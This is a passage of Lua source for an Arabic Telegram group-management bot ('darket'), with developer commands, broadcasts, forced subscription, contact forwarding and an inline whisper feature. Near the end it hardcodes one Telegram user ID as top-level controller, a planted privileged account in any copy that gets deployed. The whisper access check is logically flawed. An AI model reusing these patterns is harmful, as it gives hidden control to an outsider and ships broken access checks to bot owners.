local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
send(msg_chat_id,msg_id,[[
↯︙ارسل لي سواء كان 
❨ ملف ، ملصق ، متحركه ، صوره
 ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
– – – – – – – –
↯︙للخروج ارسل ( الغاء )
 ✓
]],"md",true)  
return false
end

if text=="اذاعه بالتوجيه ٠" then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
send(msg_chat_id,msg_id,"٠ ارسل لي التوجيه الان\n٠ليتم نشره في المجموعات","md",true)  
return false
end

if text=='اذاعه بالتوجيه خاص ٠' then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
send(msg_chat_id,msg_id,"٠ ارسل لي التوجيه الان\n٠ليتم نشره الى المشتركين","md",true)  
return false
end

if text == ("الردود العامه ٠") then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."List:Rd:Sudo")
text = "\n٠ قائمة الردود العامه \n– – – – – – – –\n"
for k,v in pairs(list) do
if Redis:get(darket.."Add:Rd:Sudo:Gif"..v) then
db = "متحركه ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:vico"..v) then
db = "بصمه ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:stekr"..v) then
db = "ملصق ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:Text"..v) then
db = "رساله ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:Photo"..v) then
db = "صوره ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:Video"..v) then
db = "فيديو ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:File"..v) then
db = "ملف ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:Audio"..v) then
db = "اغنيه ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:video_note"..v) then
db = "بصمه فيديو ٠"
end
text = text..""..k.." ٠ {"..v.."} ٠ {"..db.."}\n"
end
if #list == 0 then
text = "٠ لا توجد ردود للمطور"
end
return send(msg_chat_id,msg_id,"["..text.."]","md",true)  
end
if text == ("مسح الردود العامه ٠") then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."List:Rd:Sudo")
for k,v in pairs(list) do
Redis:del(darket.."Add:Rd:Sudo:Gif"..v)   
Redis:del(darket.."Add:Rd:Sudo:vico"..v)   
Redis:del(darket.."Add:Rd:Sudo:stekr"..v)     
Redis:del(darket.."Add:Rd:Sudo:Text"..v)   
Redis:del(darket.."Add:Rd:Sudo:Photo"..v)
Redis:del(darket.."Add:Rd:Sudo:Photoc"..v)
Redis:del(darket.."Add:Rd:Sudo:Video"..v)
Redis:del(darket.."Add:Rd:Sudo:Videoc"..v)
Redis:del(darket.."Add:Rd:Sudo:File"..v)
Redis:del(darket.."Add:Rd:Sudo:Audio"..v)
Redis:del(darket.."Add:Rd:Sudo:Audioc"..v)
Redis:del(darket.."Add:Rd:Sudo:video_note"..v)
Redis:del(darket.."List:Rd:Sudo")
end
return send(msg_chat_id,msg_id,"٠ تم حذف الردود العامه","md",true)  
end
if text == 'مسح المطورين ٠' then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Dev:Groups") 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مطورين حاليا , ","md",true)  
end
Redis:del(darket.."Dev:Groups") 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من المطورين *","md",true)
end
if text == 'مسح المطورين الثانويين ٠' then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Devss:Groups") 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مطورين حاليا , ","md",true)  
end
Redis:del(darket.."Devss:Groups") 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من المطورين *","md",true)
end
if text == 'مسح قائمه العام ٠' then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."BanAll:Groups") 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد محظورين عام حاليا , ","md",true)  
end
Redis:del(darket.."BanAll:Groups") 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من المحظورين عام *","md",true)
end
if text == 'تعطيل البوت الخدمي ٠' then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."BotFree") 
return send(msg_chat_id,msg_id,"٠ تم تعطيل البوت الخدمي ","md",true)
end
if text == 'تعطيل التواصل ٠' then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."TwaslBot") 
return send(msg_chat_id,msg_id,"٠ تم تعطيل التواصل داخل البوت ","md",true)
end
if text == 'تفعيل البوت الخدمي ٠' then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."BotFree",true) 
return send(msg_chat_id,msg_id,"٠ تم تفعيل البوت الخدمي ","md",true)
end
if text == "تعطيل الاشتراك الاجباري لكل الاعضاء ٠" then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if not Redis:get(darket.."chmembers") then
return send(msg_chat_id,msg_id,'\n*٠ الامر معطل بالفعل* ',"md",true)  
end
Redis:del(darket.."chmembers")
send(msg_chat_id,msg_id,'\n*٠ تم تعطيل وضع الاشتراك الاجباري لكل الاعضاء اصبح عند استخدام اوامر البوت فقط* ',"md",true)  
end
if text == "تفعيل الاشتراك الاجباري لكل الاعضاء ٠" then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if not Redis:get(darket.."chfalse") then
return send(msg_chat_id,msg_id,'\n*٠ عذرا عليك تعيين قناه للاشتراك الاجباري اولا* ',"md",true)  
end
Redis:set(darket.."chmembers","on")
send(msg_chat_id,msg_id,'\n*٠ تم تفعيل وضع الاشتراك لكل الاعضاء* ',"md",true)  
end
if text == "تفعيل الاشتراك الاجباري ٠" then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
Redis:set(darket.."ch:addd"..msg.sender.user_id,"on")
send(msg_chat_id,msg_id,'٠ ارسل الان معرف القناه ',"md",true)  
end
if text == "تعطيل الاشتراك الاجباري ٠" then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
Redis:del(darket.."ch:admin")
Redis:del(darket.."chfalse")
send(msg_chat_id,msg_id,'٠ تم حذف القناه ',"md",true)  
end
if Redis:get(darket.."set:chs"..msg.sender.user_id) then
if text then
if text == "الغاء" then
Redis:del(darket.."set:chs"..msg.sender.user_id)
return send(msg_chat_id,msg_id,'تم الغاء الامر بنجاح ',"md",true)  
end
if text:match("^@(.*)$") then
local ch = text:match("^@(.*)$")
Redis:set(darket.."chsource",ch)
Redis:del(darket.."set:chs"..msg.sender.user_id)
send(msg_chat_id,msg_id,'تم حفظ معرف ٠ TeAm DarKet ٠️ ',"md",true)  
dofile('darket.lua')  
else
send(msg_chat_id,msg_id,'المعرف خطأ ',"md",true)  
end
end
end
if text == "تعيين قناه السورس ٠" then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
Redis:set(darket.."set:chs"..msg.sender.user_id,true)
return send(msg_chat_id,msg_id,'ارسل معرف القناه الان',"md",true)  
end
if Redis:get(darket.."set:rmz"..msg.sender.user_id) then
if text then
if text == "الغاء" then
Redis:del(darket.."set:rmz"..msg.sender.user_id)
return send(msg_chat_id,msg_id,'تم الغاء الامر بنجاح ',"md",true)  
end
Redis:set(darket..'rmzsource',text)
Redis:del(darket.."set:rmz"..msg.sender.user_id)
send(msg_chat_id,msg_id,'تم حفظ رمز السورس ',"md",true)  
dofile('darket.lua')  
end
end
if text == "تعيين رمز السورس ٠" then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
Redis:set(darket.."set:rmz"..msg.sender.user_id,true)
return send(msg_chat_id,msg_id,'ارسل رمز بدل من { ٠ }',"md",true)  
end
if text == "حذف رمز السورس ٠" then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
Redis:set(darket.."rmzsource","٠")
return send(msg_chat_id,msg_id,'تم ارجاع رمز السورس الي  { ٠ }',"md",true)  
end
if Redis:get(darket.."set:devs"..msg.sender.user_id) then
if text then
if text == "الغاء" then
Redis:del(darket.."set:devs"..msg.sender.user_id)
return send(msg_chat_id,msg_id,'تم الغاء الامر بنجاح ',"md",true)  
end
if text:match("^@(.*)$") then
local ch = text:match("^@(.*)$")
Redis:set(darket.."chdevolper",ch)
Redis:del(darket.."set:devs"..msg.sender.user_id)
send(msg_chat_id,msg_id,'تم حفظ معرف مطور السورس ',"md",true)  
dofile('darket.lua')  
else
send(msg_chat_id,msg_id,'المعرف خطأ ',"md",true)  
end
end
end
if text == "تعيين مطور السورس ٠" then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
Redis:set(darket.."set:devs"..msg.sender.user_id,true)
return send(msg_chat_id,msg_id,'ارسل معرف المطور الان',"md",true)  
end
if text == 'تفعيل التواصل ٠' then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."TwaslBot",true) 
return send(msg_chat_id,msg_id,"٠ تم تفعيل التواصل داخل البوت ","md",true)
end
if text == 'قائمه العام ٠' then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."BanAll:Groups") 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد محظورين عام حاليا , ","md",true)  
end
ListMembers = '\n*٠ قائمه المحظورين عام  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)

if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح المحظورين عام', data = msg.sender.user_id..'/BanAll'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المطورين ٠' then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Dev:Groups") 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مطورين حاليا , ","md",true)  
end
ListMembers = '\n*٠ قائمه مطورين البوت \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح المطورين', data = msg.sender.user_id..'/Dev'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المطورين الثانويين ٠' then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Devss:Groups") 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مطورين حاليا , ","md",true)  
end
ListMembers = '\n*٠ قائمه مطورين البوت \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح المطورين', data = msg.sender.user_id..'/Dev'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if not msg.Devss then
if Redis:get(darket.."TwaslBot") and not Redis:sismember(darket.."BaN:In:Tuasl",msg.sender.user_id) then
local ListGet = {Sudo_Id,msg.sender.user_id}
local IdSudo = LuaTele.getChat(ListGet[1]).id
local IdUser = LuaTele.getChat(ListGet[2]).id
local FedMsg = LuaTele.sendForwarded(IdSudo, 0, IdUser, msg_id)
Redis:setex(darket.."Twasl:UserId"..msg.date,172800,IdUser)
if FedMsg.content.luatele == "messageSticker" then
send(IdSudo,0,Reply_Status(IdUser,'٠قام بارسال الملصق').Reply,"md",true)  
end
return send(IdUser,msg_id,Reply_Status(IdUser,'٠ تم ارسال رسالتك الى المطور').Reply,"md",true)  
end
else 
if msg.reply_to_message_id ~= 0 then
local Message_Get = LuaTele.getMessage(msg_chat_id, msg.reply_to_message_id)
if Message_Get.forward_info then
local Info_User = Redis:get(darket.."Twasl:UserId"..Message_Get.forward_info.date) or 46899864
if text == 'حظر' then
Redis:sadd(darket..'BaN:In:Tuasl',Info_User)  
return send(msg_chat_id,msg_id,Reply_Status(Info_User,'٠ تم حظره من تواصل البوت ').Reply,"md",true)  
end 
if text =='الغاء الحظر' or text =='الغاء حظر' then
Redis:srem(darket..'BaN:In:Tuasl',Info_User)  
return send(msg_chat_id,msg_id,Reply_Status(Info_User,'٠ تم الغاء حظره من تواصل البوت ').Reply,"md",true)  
end 
local ChatAction = LuaTele.sendChatAction(Info_User,'Typing')
if not Info_User or ChatAction.message == "USER_IS_BLOCKED" then
send(msg_chat_id,msg_id,Reply_Status(Info_User,'٠قام بحظر البوت لا استطيع ارسال رسالتك ').Reply,"md",true)  
end
if msg.content.video_note then
LuaTele.sendVideoNote(Info_User, 0, msg.content.video_note.video.remote.id)
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
LuaTele.sendPhoto(Info_User, 0, idPhoto,'')
elseif msg.content.sticker then 
LuaTele.sendSticker(Info_User, 0, msg.content.sticker.sticker.remote.id)
elseif msg.content.voice_note then 
LuaTele.sendVoiceNote(Info_User, 0, msg.content.voice_note.voice.remote.id, '', 'md')
elseif msg.content.video then 
LuaTele.sendVideo(Info_User, 0, msg.content.video.video.remote.id, '', "md")
elseif msg.content.animation then 
LuaTele.sendAnimation(Info_User,0, msg.content.animation.animation.remote.id, '', 'md')
elseif msg.content.document then
LuaTele.sendDocument(Info_User, 0, msg.content.document.document.remote.id, '', 'md')
elseif msg.content.audio then
LuaTele.sendAudio(Info_User, 0, msg.content.audio.audio.remote.id, '', "md") 
elseif text then
send(Info_User,0,text,"md",true)
end 
send(msg_chat_id,msg_id,Reply_Status(Info_User,'٠ تم ارسال رسالتك اليه ').Reply,"md",true)  
end
end
end 
end --UserBot
end -- File_Bot_Run

function CallBackLua(data)

if data and data.luatele and data.luatele == "updateNewInlineQuery" then

local Text = data.query 
if Text == '' then
local input_message_content = {message_text = " ٭ اهلا بك\n ٭ لارسال الهمسه اكتب يوزر البوت + الهمسه + يوزر العضو اللي هتعمله همسه \n ٭ مثال  @M_77bot هلا @R2RR7"}	
local resuult = {{
type = 'article',
id = math.random(1,64),
title = 'اضغط هنا لمعرفه كيفيه ارسال الهمسه',
input_message_content = input_message_content,
reply_markup = {
inline_keyboard ={
{{text ="ch", url= "https://t.me/R125R"}},
}
},
},
}
https.request("https://api.telegram.org/bot"..Token..'/answerInlineQuery?inline_query_id='..data.id..'&switch_pm_text=@R2RR7&switch_pm_parameter=start&results='..JSON.encode(resuult))
end
if Text and Text:match("(.*)@(.*)") then
local hm = {string.match(Text,"(.*)@(.*)")}
local user = hm[2]
local hms = hm[1]
UserId_Info = LuaTele.searchPublicChat(user)
local idd = UserId_Info.id
local key = math.random(1,999999)
Redis:set(idd..key.."hms",hms)
local us = LuaTele.getUser(idd)
local name = us.first_name
local input_message_content = {message_text = "٭ هذه همسه سريه الي ["..name.."](tg://user?id="..idd..")\n ٭ هو فقط يستطيع رؤيتها ", parse_mode = 'Markdown'}	
local resuult = {{
type = 'article',
id = math.random(1,64),
title = 'هذه همسه سريه الي '..name..'',
input_message_content = input_message_content,
reply_markup = {
inline_keyboard ={
{{text ="اضغط هنا لرؤيتها", callback_data = idd.."hmsaa"..data.sender_user_id.."/"..key}},
}
},
},
}
https.request("https://api.telegram.org/bot"..Token..'/answerInlineQuery?inline_query_id='..data.id..'&switch_pm_text=اضغط لارسال الهمسه&switch_pm_parameter=start&results='..JSON.encode(resuult))
end
end
if data and data.luatele and data.luatele == "updateNewInlineCallbackQuery" then

local Text = LuaTele.base64_decode(data.payload.data)
if Text and Text:match('(.*)hmsaa(.*)/(.*)')  then
local mk = {string.match(Text,"(.*)hmsaa(.*)/(.*)")}
local hms = Redis:get(mk[1]..mk[3].."hms")
if tonumber(mk[1]) == tonumber(data.sender_user_id) or tonumber(mk[2]) == tonumber(data.sender_user_id) then
https.request("https://api.telegram.org/bot"..Token.."/answerCallbackQuery?callback_query_id="..data.id.."&text="..URL.escape(hms).."&show_alert=true")
end
if tonumber(mk[1]) ~= tonumber(data.sender_user_id) or tonumber(mk[2]) ~= tonumber(data.sender_user_id) then
https.request("https://api.telegram.org/bot"..Token.."/answerCallbackQuery?callback_query_id="..data.id.."&text="..URL.escape("الهمسه ليست لك").."&show_alert=true")
end
end
end
if data and data.luatele and data.luatele == "updateSupergroup" then
local Get_Chat = LuaTele.getChat('-100'..data.supergroup.id)
if data.supergroup.status.luatele == "chatMemberStatusBanned" then
Redis:srem(darket.."ChekBotAdd",'-100'..data.supergroup.id)
local keys = Redis:keys(darket..'*'..'-100'..data.supergroup.id..'*')
Redis:del(darket.."List:Manager"..'-100'..data.supergroup.id)
Redis:del(darket.."Command:List:Group"..'-100'..data.supergroup.id)
for i = 1, #keys do 
Redis:del(keys[i])
end
return send(Sudo_Id,0,'*\n٠ تم طرد البوت من كروب جديده \n٠اسم الكروب : '..Get_Chat.title..'\n٠ايدي الكروب :*`-100'..data.supergroup.id..'`\n٠ تم مسح جميع البيانات المتعلقه بالكروب',"md")
end
elseif data and data.luatele and data.luatele == "updateMessageSendSucceeded" then
local msg = data.message
local Chat = msg.chat_id
if msg.content.text then
text = msg.content.text.text
end

if msg.content.video_note then
if msg.content.video_note.video.remote.id == Redis:get(darket.."PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(darket.."PinMsegees:"..msg.chat_id)
end
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
if idPhoto == Redis:get(darket.."PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(darket.."PinMsegees:"..msg.chat_id)
end
elseif msg.content.sticker then 
if msg.content.sticker.sticker.remote.id == Redis:get(darket.."PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(darket.."PinMsegees:"..msg.chat_id)
end
elseif msg.content.voice_note then 
if msg.content.voice_note.voice.remote.id == Redis:get(darket.."PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(darket.."PinMsegees:"..msg.chat_id)
end
elseif msg.content.video then 
if msg.content.video.video.remote.id == Redis:get(darket.."PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(darket.."PinMsegees:"..msg.chat_id)
end
elseif msg.content.animation then 
if msg.content.animation.animation.remote.id ==  Redis:get(darket.."PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(darket.."PinMsegees:"..msg.chat_id)
end
elseif msg.content.document then
if msg.content.document.document.remote.id == Redis:get(darket.."PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(darket.."PinMsegees:"..msg.chat_id)
end
elseif msg.content.audio then
if msg.content.audio.audio.remote.id == Redis:get(darket.."PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(darket.."PinMsegees:"..msg.chat_id)
end
elseif text then
if text == Redis:get(darket.."PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(darket.."PinMsegees:"..msg.chat_id)
end
end
elseif data and data.luatele and data.luatele == "updateNewMessage" then
if data.message.content.luatele == "messageChatDeleteMember" or data.message.content.luatele == "messageChatAddMembers" or data.message.content.luatele == "messagePinMessage" or data.message.content.luatele == "messageChatChangeTitle" or data.message.content.luatele == "messageChatJoinByLink" then
if Redis:get(darket.."Lock:tagservr"..data.message.chat_id) then
LuaTele.deleteMessages(data.message.chat_id,{[1]= data.message.id})
end
end 
if tonumber(data.message.sender.user_id) == tonumber(darket) then
return false
end
if data.message.content.luatele == "messageChatJoinByLink" and Redis:get(darket..'Status:joinet'..data.message.chat_id) == 'true' then
    local reply_markup = LuaTele.replyMarkup{
    type = 'inline',
    data = {
    {
    {text = ' انا لست بوت ', data = data.message.sender.user_id..'/UnKed'},
    },
    }
    } 
    LuaTele.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
    return send(data.message.chat_id, data.message.id, '٠ عليك اختيار انا لست بوت لتخطي نظام التحقق', 'md',false, false, false, false, reply_markup)
    end
File_Bot_Run(data.message,data.message)
elseif data and data.luatele and data.luatele == "updateMessageEdited" then
-- data.chat_id -- data.message_id
local Message_Edit = LuaTele.getMessage(data.chat_id, data.message_id)
if Message_Edit.sender.user_id == darket then
print('This is Edit for Bot')
return false
end
File_Bot_Run(Message_Edit,Message_Edit)
if tonumber(Message_Edit.sender.user_id) == 5386549632 then
data.The_Controller = 1
elseif tonumber(Message_Edit.sender.user_id) == 5386549632 then
data.The_Controller = 1
elseif The_ControllerAll(Message_Edit.sender.user_id) == true then  
data.The_Controller = 1
elseif Redis:sismember(darket.."Devss:Groups",Message_Edit.sender.user_id) == true then
data.The_Controller = 2
elseif Redis:sismember(darket.."Dev:Groups",Message_Edit.sender.user_id) == true then
data.The_Controller = 3
elseif Redis:sismember(darket.."Ownerss:Group"..data.chat_id,Message_Edit.sender.user_id) == true then
data.The_Controller = 44
elseif Redis:sismember(darket.."SuperCreator:Group"..data.chat_id,Message_Edit.sender.user_id) == true then
data.The_Controller = 4
